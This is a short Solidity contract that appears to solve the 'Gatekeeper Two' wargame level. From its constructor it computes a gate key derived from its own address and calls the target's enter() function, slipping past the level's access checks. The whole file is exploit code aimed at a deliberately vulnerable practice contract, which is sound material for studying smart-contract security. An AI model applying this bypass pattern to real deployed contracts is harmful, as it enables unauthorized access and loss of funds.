// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

interface IGatekeeperTwo {
    function enter(bytes8) external returns(bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo gatekeeper;
    constructor (address _contract) {
        gatekeeper = IGatekeeperTwo(_contract);
        uint64 gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(this))));
        gatekeeper.enter(bytes8(gateKey));
    }
}